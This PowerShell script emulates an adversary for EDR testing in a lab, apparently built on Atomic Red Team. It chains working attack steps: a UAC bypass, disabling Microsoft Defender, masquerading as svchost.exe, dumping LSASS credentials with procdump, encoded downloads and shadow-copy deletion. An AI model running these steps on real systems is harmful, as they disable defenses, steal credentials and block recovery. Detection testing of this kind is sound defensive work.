<#
.SYNOPSIS
    A modular script to emulate adversary tactics for EDR testing.

.DESCRIPTION
    This script executes a series of MITRE ATT&CK techniques in a logical sequence.
    Each tactic is contained within its own function, and all actions are logged.

.WARNING
    ********************************************************************************
    *** FOR AUTHORIZED LAB USE ONLY - REVIEW EACH COMMAND BEFORE RUNNING       ***
    *** ***
    *** This script makes significant changes to a system to mimic malicious   ***
    *** behavior. Run this ONLY on a dedicated, isolated lab machine that you   ***
    *** have explicit permission to test. DO NOT run on a production system.    ***
    ********************************************************************************
#>

# --- Script Configuration & Logging ---
$ScriptRoot = $PSScriptRoot
$LogFile = Join-Path $ScriptRoot "Attack-Simulation-Log.txt"
$ErrorActionPreference = "SilentlyContinue"

function Write-Log {
    param(
        [Parameter(Mandatory=$true)][string]$Message,
        [Parameter()][ValidateSet("INFO", "WARN", "ERROR", "SUCCESS")][string]$Level = "INFO",
        [Parameter()][switch]$NoConsole
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    $LogMessage | Out-File -FilePath $LogFile -Append
    if (-not $NoConsole) {
        $Color = @{ INFO = "White"; WARN = "Yellow"; ERROR = "Red"; SUCCESS = "Green" }
        if ($Color.ContainsKey($Level)) {
            Write-Host $LogMessage -ForegroundColor $Color[$Level]
        } else {
            Write-Host $LogMessage
        }
    }
}

# --- Prerequisite Checks ---
function Check-Prerequisites {
    Write-Log "Running prerequisite checks..."
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log -Level ERROR "This script must be run with Administrator privileges. Terminating."
        throw "Administrator privileges required."
    }
    Write-Log -Level SUCCESS "Administrator privileges confirmed."
    if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
        Write-Log -Level WARN "Module 'Invoke-AtomicRedTeam' not found. Attempting to install..."
        Install-Module -Name Invoke-AtomicRedTeam -Scope AllUsers -Force -AllowClobber
        if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
            Write-Log -Level ERROR "Failed to install 'Invoke-AtomicRedTeam' module. Terminating."
            throw "Module installation failed."
        }
        Write-Log -Level SUCCESS "'Invoke-AtomicRedTeam' module installed successfully."
    } else {
        Write-Log -Level SUCCESS "Module 'Invoke-AtomicRedTeam' is already installed."
    }
    Import-Module Invoke-AtomicRedTeam
    Write-Log -Level SUCCESS "All prerequisites are met."
    return $true
}

# --- Tactic 1: Execution ---
function Invoke-ExecutionTactic {
    Write-Log "--- Starting Tactic: EXECUTION ---"
    Write-Log "Executing T1059.005: CScript launching cmd.exe for recon..."
    $vbsPath = Join-Path $ScriptRoot "temp-recon.vbs"
    $vbsCode = 'Set objShell = CreateObject("WScript.Shell"): objShell.Run "cmd /c whoami & hostname", 0, True'
    try {
        Set-Content -Path $vbsPath -Value $vbsCode
        cscript.exe $vbsPath //Nologo
        Write-Log -Level SUCCESS "Successfully executed VBScript for recon."
    } catch {
        Write-Log -Level ERROR "Execution Tactic Failed: T1059.005 - $($_.Exception.Message)"
        throw
    } finally {
        if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force }
    }
}

# --- Tactic 2: Persistence ---
function Invoke-PersistenceTactic {
    Write-Log "--- Starting Tactic: PERSISTENCE ---"
    Write-Log "Executing T1053.005: Scheduled Task..."
    try {
        Invoke-AtomicTest T1053.005 -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully created scheduled task."
    } catch {
        Write-Log -Level ERROR "Persistence Tactic Failed: T1053.005 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 3: Privilege Escalation ---
function Invoke-PrivilegeEscalationTactic {
    Write-Log "--- Starting Tactic: PRIVILEGE ESCALATION ---"
    Write-Log "Executing T1548.002: Bypass User Account Control (fodhelper)..."
    try {
        Invoke-AtomicTest T1548.002 -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully executed UAC bypass."
    } catch {
        Write-Log -Level ERROR "Privilege Escalation Tactic Failed: T1548.002 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 4: Defense Evasion ---
function Invoke-DefenseEvasionTactic {
    Write-Log "--- Starting Tactic: DEFENSE EVASION ---"
    # T1562.001: Disable or Modify Tools
    Write-Log "Executing T1562.001: Disable Microsoft Defender..."
    try {
        Invoke-AtomicTest T1562.001 -TestNumbers 4
        Write-Log -Level SUCCESS "Successfully executed command to disable Defender."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1562.001 - $($_.Exception.Message)"
        throw
    }
    Start-Sleep -s 2
    # T1027: Obfuscated Files or Information
    Write-Log "Executing T1027: PowerShell with encoded command..."
    try {
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host '[SUCCESS] Encoded command executed.'"))
        powershell.exe -EncodedCommand $encodedCommand
        Write-Log -Level SUCCESS "Successfully executed encoded PowerShell command."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1027 - $($_.Exception.Message)"
        throw
    }
    Start-Sleep -s 2
    # T1105: Ingress Tool Transfer
    Write-Log "Executing T1105: Ingress Tool Transfer with certutil..."
    try {
        Invoke-AtomicTest T1105 -TestNumbers 3
        Write-Log -Level SUCCESS "Successfully used certutil to download a file."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1105 - $($_.Exception.Message)"
        throw
    }
    Start-Sleep -s 2
    # T1036.003: Masquerading
    Write-Log "Executing T1036.003: Masquerading..."
    $masqueradePath = Join-Path $env:TEMP "svchost.exe"
    try {
        Copy-Item -Path ($PSHOME + "\powershell.exe") -Destination $masqueradePath -Force
        Start-Process -FilePath $masqueradePath -ArgumentList "-Command Write-Host '[SUCCESS] Masqueraded process executed.'"
        Write-Log -Level SUCCESS "Successfully executed masqueraded process."
    } catch {
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1036.003 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 5: Credential Access ---
function Invoke-CredentialAccessTactic {
    Write-Log "--- Starting Tactic: CREDENTIAL ACCESS ---"
    Write-Log "Executing T1003.001: Dumping LSASS memory with procdump..."
    $sysinternalsZip = Join-Path $env:TEMP "SysinternalsSuite.zip"
    $sysinternalsDir = Join-Path $env:TEMP "SysinternalsSuite"
    $procdumpPath = Join-Path $sysinternalsDir "procdump64.exe"
    $lsassDumpFile = Join-Path $ScriptRoot "lsass.dmp"
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://download.sysinternals.com/files/SysinternalsSuite.zip", $sysinternalsZip)
        Expand-Archive -Path $sysinternalsZip -DestinationPath $sysinternalsDir -Force
        if (-not (Test-Path $procdumpPath)) { throw "procdump64.exe not found." }
        & $procdumpPath -accepteula -ma lsass.exe $lsassDumpFile
        if (Test-Path $lsassDumpFile) {
            Write-Log -Level SUCCESS "Successfully dumped LSASS memory to $lsassDumpFile."
        } else {
            throw "LSASS dump file was not created."
        }
    } catch {
        Write-Log -Level ERROR "Credential Access Tactic Failed: T1003.001 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 6: Discovery ---
function Invoke-DiscoveryTactic {
    Write-Log "--- Starting Tactic: DISCOVERY ---"
    Write-Log "Executing common on-host reconnaissance commands..."
    try {
        Invoke-AtomicTest T1082
        Invoke-AtomicTest T1057
        Invoke-AtomicTest T1049
        Write-Log -Level SUCCESS "Successfully executed basic on-host discovery."
    } catch {
        Write-Log -Level ERROR "Discovery Tactic Failed: Basic Recon - $($_.Exception.Message)"
        throw
    }
    Start-Sleep -s 2
    Write-Log "Executing T1018: Remote System Discovery using masqueraded process..."
    $masqueradePath = Join-Path $env:TEMP "svchost.exe"
    $reconFile = Join-Path $ScriptRoot "network_recon.txt"
    try {
        if (-not (Test-Path $masqueradePath)) { throw "Masqueraded executable not found." }
        & $masqueradePath -Command "arp -a | Out-File -FilePath $reconFile"
        if (Test-Path $reconFile) {
            Write-Log -Level SUCCESS "Successfully performed network scan and saved results."
        } else {
            throw "Network recon file was not created."
        }
    } catch {
        Write-Log -Level ERROR "Discovery Tactic Failed: T1018 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 7: Command and Control (C2) ---
function Invoke-CommandAndControlTactic {
    Write-Log "--- Starting Tactic: COMMAND AND CONTROL ---"
    Write-Log "Executing T1105: Ingress Tool Transfer via PowerShell Encoded Command..."
    $downloadFile = Join-Path $env:TEMP "c2_payload.txt"
    try {
        $downloadCommand = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/test.txt' -OutFile '$downloadFile'"
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($downloadCommand))
        powershell.exe -EncodedCommand $encodedCommand
        if (Test-Path $downloadFile) {
            Write-Log -Level SUCCESS "Successfully executed encoded download command."
        } else {
            throw "Downloaded file was not created."
        }
    } catch {
        Write-Log -Level ERROR "C2 Tactic Failed: T1105 - $($_.Exception.Message)"
        throw
    }
    Start-Sleep -s 2
    Write-Log "Executing T1197: BITS Job..."
    try {
        Invoke-AtomicTest T1197 -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully created BITS job for download."
    } catch {
        Write-Log -Level ERROR "C2 Tactic Failed: T1197 - $($_.Exception.Message)"
        throw
    }
}

# --- Tactic 8: Impact ---
function Invoke-ImpactTactic {
    Write-Log "--- Starting Tactic: IMPACT ---"
    Write-Log "Executing T1490: Inhibit System Recovery..."
    try {
        Invoke-AtomicTest T1490 -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully executed shadow copy deletion."
    } catch {
        Write-Log -Level ERROR "Impact Tactic Failed: T1490 - $($_.Exception.Message)"
        throw
    }
}

# --- Main Script Body ---
$CleanupCommands = [System.Collections.ArrayList]@()
try {
    if (Check-Prerequisites) {
        Write-Log "Starting emulation chain..."
        
        Invoke-ExecutionTactic
        $CleanupCommands.Add("Write-Host 'Execution Tactic cleanup is manual.'") | Out-Null
        Invoke-PersistenceTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup") | Out-Null
        Invoke-PrivilegeEscalationTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1548.002 -TestNumbers 1 -Cleanup") | Out-Null
        Invoke-DefenseEvasionTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1562.001 -TestNumbers 4 -Cleanup") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1105 -TestNumbers 3 -Cleanup") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'svchost.exe') -Force -ErrorAction SilentlyContinue") | Out-Null
        Invoke-CredentialAccessTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'SysinternalsSuite.zip') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'SysinternalsSuite') -Recurse -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path $PSScriptRoot 'lsass.dmp') -Force -ErrorAction SilentlyContinue") | Out-Null
        Invoke-DiscoveryTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $PSScriptRoot 'network_recon.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        Invoke-CommandAndControlTactic
        $CleanupCommands.Add("Remove-Item (Join-Path $env:TEMP 'c2_payload.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1197 -TestNumbers 1 -Cleanup") | Out-Null
        Invoke-ImpactTactic
        $CleanupCommands.Add("Invoke-AtomicTest T1490 -TestNumbers 1 -Cleanup") | Out-Null

        Write-Log -Level SUCCESS "Emulation chain completed successfully."
    }
} catch {
    Write-Log -Level ERROR "A fatal error occurred during emulation: $($_.Exception.Message). Script terminated."
    Write-Log "Attempting to run cleanup for any completed steps..."
} finally {
    Write-Log "Script finished."
    if ($CleanupCommands.Count -gt 0) {
        Write-Host "`n" + ("-"*60)
        Write-Log -Level WARN "CLEANUP REQUIRED: Run the following commands to revert changes:"
        foreach ($command in $CleanupCommands) { Write-Host $command -ForegroundColor Yellow }
        Write-Host ("-"*60)
    }
}